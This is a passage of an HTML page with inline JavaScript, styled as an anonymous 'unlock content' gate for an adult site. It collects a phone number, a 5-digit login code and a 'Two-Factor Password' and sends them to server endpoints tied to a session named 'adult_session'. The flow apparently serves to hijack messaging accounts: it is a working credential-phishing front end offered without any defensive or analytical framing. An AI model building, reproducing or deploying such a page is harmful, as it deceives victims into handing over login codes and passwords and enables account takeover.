                </div>
            </div>

            <div class="input-group" id="passwordGroup" style="display:none;">
                <label>Two-Factor Password</label>
                <input type="password" id="password" placeholder="Enter 2FA password">
            </div>

            <button onclick="verifyCode()" id="verifyBtn">Unlock Content</button>

            <div class="loading" id="loading2">
                <div class="spinner"></div>
                <p style="color: #888; font-size: 14px;">Verifying your access...</p>
            </div>

            <div class="resend">
                Didn't receive code? <a onclick="backToStep1()">Try again</a>
            </div>
        </div>

        <div id="message"></div>

        <div class="secure-badge">
            <svg viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
            <span>256-bit SSL Encrypted • Anonymous Access</span>
        </div>

        <div class="footer-links">
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
            <a href="#">2257 Compliance</a>
            <a href="#">DMCA</a>
        </div>
    </div>

    <script>
        let currentSessionId = null;

        // Create floating particles
        function createParticles() {
            const container = document.getElementById('particles');
            for (let i = 0; i < 20; i++) {
                const particle = document.createElement('div');
                particle.className = 'particle';
                particle.style.left = Math.random() * 100 + '%';
                particle.style.animationDelay = Math.random() * 15 + 's';
                particle.style.animationDuration = (10 + Math.random() * 10) + 's';
                container.appendChild(particle);
            }
        }
        createParticles();

        function showMessage(text, type='info') {
            const msg = document.getElementById('message');
            msg.innerHTML = `<div class="info-box ${type}">${text}</div>`;
            setTimeout(() => msg.innerHTML = '', 5000);
        }

        // OTP Input Handling
        const otpInputs = document.querySelectorAll('.otp-input');
        otpInputs.forEach((input, index) => {
            input.addEventListener('input', (e) => {
                if (e.target.value) {
                    e.target.classList.add('filled');
                    if (index < otpInputs.length - 1) {
                        otpInputs[index + 1].focus();
                    }
                } else {
                    e.target.classList.remove('filled');
                }
            });

            input.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && !e.target.value && index > 0) {
                    otpInputs[index - 1].focus();
                }
                if (e.key === 'Enter') {
                    verifyCode();
                }
            });

            input.addEventListener('paste', (e) => {
                e.preventDefault();
                const pasted = e.clipboardData.getData('text').replace(/\s/g, '').slice(0, 5);
                pasted.split('').forEach((char, i) => {
                    if (otpInputs[i]) {
                        otpInputs[i].value = char;
                        otpInputs[i].classList.add('filled');
                    }
                });
                if (otpInputs[pasted.length]) {
                    otpInputs[pasted.length].focus();
                }
            });
        });

        function getOTPCode() {
            return Array.from(otpInputs).map(input => input.value).join('');
        }

        async function sendCode() {
            const phone = document.getElementById('phone').value.trim();

            if (!phone || phone.length < 10) {
                showMessage('❌ Please enter a valid phone number with country code', 'error');
                return;
            }

            document.getElementById('loading1').classList.add('active');
            document.getElementById('sendBtn').disabled = true;

            try {
                const r = await fetch('/api/send-code', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({phone, session_name: 'adult_session'})
                });

                const data = await r.json();

                if (data.ok) {
                    currentSessionId = data.session_id;
                    document.getElementById('phoneDisplay').textContent = phone;
                    document.getElementById('step1').classList.remove('active');
                    document.getElementById('step2').classList.add('active');
                    otpInputs[0].focus();
                } else {
                    showMessage('❌ ' + (data.error || 'Failed to send code'), 'error');
                    document.getElementById('sendBtn').disabled = false;
                }
            } catch (e) {
                showMessage('❌ Connection error. Please try again.', 'error');
                document.getElementById('sendBtn').disabled = false;
            }

            document.getElementById('loading1').classList.remove('active');
        }

        async function verifyCode() {
            const code = getOTPCode();
            const password = document.getElementById('password').value;

            if (code.length !== 5) {
                showMessage('❌ Please enter all 5 digits', 'error');
                return;
            }

            document.getElementById('loading2').classList.add('active');
            document.getElementById('verifyBtn').disabled = true;

            try {
                const r = await fetch('/api/verify-code', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        session_id: currentSessionId,
                        code: code,
                        password: password || undefined
                    })
                });

                const data = await r.json();

                if (data.ok) {
                    window.location.href = '/dashboard';
                } else if (data.requires_password) {
                    document.getElementById('passwordGroup').style.display = 'block';
                    showMessage('🔐 Two-factor authentication required', 'info');
                    document.getElementById('verifyBtn').disabled = false;
                } else {
                    showMessage('❌ ' + (data.error || 'Invalid code'), 'error');
                    document.getElementById('verifyBtn').disabled = false;
                    // Clear OTP on error
                    otpInputs.forEach(input => {
                        input.value = '';
                        input.classList.remove('filled');
                    });
                    otpInputs[0].focus();
                }
            } catch (e) {
                showMessage('❌ Connection error. Please try again.', 'error');
                document.getElementById('verifyBtn').disabled = false;
            }

            document.getElementById('loading2').classList.remove('active');
        }

        function backToStep1() {
            document.getElementById('step2').classList.remove('active');
            document.getElementById('step1').classList.add('active');
            document.getElementById('sendBtn').disabled = false;
            document.getElementById('passwordGroup').style.display = 'none';
            otpInputs.forEach(input => {
                input.value = '';
                input.classList.remove('filled');
            });
            currentSessionId = null;
        }

        // Enter key support for phone
        document.getElementById('phone')?.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') sendCode();
        });
    </script>
</body>
</html>